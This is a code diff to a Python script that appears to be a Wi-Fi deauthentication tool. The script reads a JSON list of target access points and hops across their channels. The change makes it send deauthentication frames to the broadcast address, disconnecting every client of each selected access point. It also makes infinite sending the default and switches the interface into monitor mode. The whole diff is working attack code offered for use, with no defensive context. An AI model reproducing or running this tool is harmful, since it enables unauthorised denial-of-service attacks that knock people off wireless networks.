@@ -22,7 +22,8 @@ def channel_set(channel, interface):
     print("[Interface]: %s switching to channel %d" %(interface, int(channel)))
     os.system("iw dev %s set channel %d" %(interface, int(channel)))
 
-def multi_deauth(fileName,interface,client):
+def multi_deauth(fileName,interface,count):
+    client = 'FF:FF:FF:FF:FF:FF'
     aps_data = open(fileName,"r+")
     apsList = json.load(aps_data)
     aps_data.close()
@@ -33,31 +34,43 @@ def multi_deauth(fileName,interface,client):
             channel = aps[apid][channel_pos]
             if not channel_exist(channel):
                 channels.append(channel)
-    try:
-        while True:
+    if count == 0:
+        try:
+            while True:
+                for channel in range(len(channels)):
+                    channel_set(channels[channel],interface)
+                    for apid in range(len(aps)):
+                        if aps[apid][select_pos] == True:
+                            bssid = aps[apid][bssid_pos]
+                            deauth(interface, bssid, client)
+                    time.sleep(1)
+        except KeyboardInterrupt:
+            print('[Stop]')
+    else:
+        for loop in range(count):
             for channel in range(len(channels)):
                 channel_set(channels[channel],interface)
                 for apid in range(len(aps)):
                     if aps[apid][select_pos] == True:
                         bssid = aps[apid][bssid_pos]
                         deauth(interface, bssid, client)
-                time.sleep(2)
-    except KeyboardInterrupt:
-        print('[Stop]')
-
+                time.sleep(1)            
 
  
 if __name__ == "__main__": 
     if (len(sys.argv) != 3) and (len(sys.argv) !=4):
-        print('[Usage]: %s target_list interface client_mac' % sys.argv[0])
-        print('[Usage]: empty client_mac default to broadcast mode')
+        print('[Usage]: %s target_list interface count' % sys.argv[0])
+        print('[Usage]: empty count default to infinite sending')
         sys.exit(1)
     elif (len(sys.argv) == 3):
         aps_list = sys.argv[1]
         interface = sys.argv[2]
-        client = 'FF:FF:FF:FF:FF:FF'
+        count = 0
     elif (len(sys.argv) == 4):
         aps_list = sys.argv[1]
         interface = sys.argv[2]
-        client = sys.argv[3]
-    multi_deauth(aps_list,interface,client)
+        count = int(sys.argv[3])
+    interface = monitor_up(interface)
+    multi_deauth(aps_list,interface,count)
+    interface = monitor_down(interface)
+    sys.exit(0)
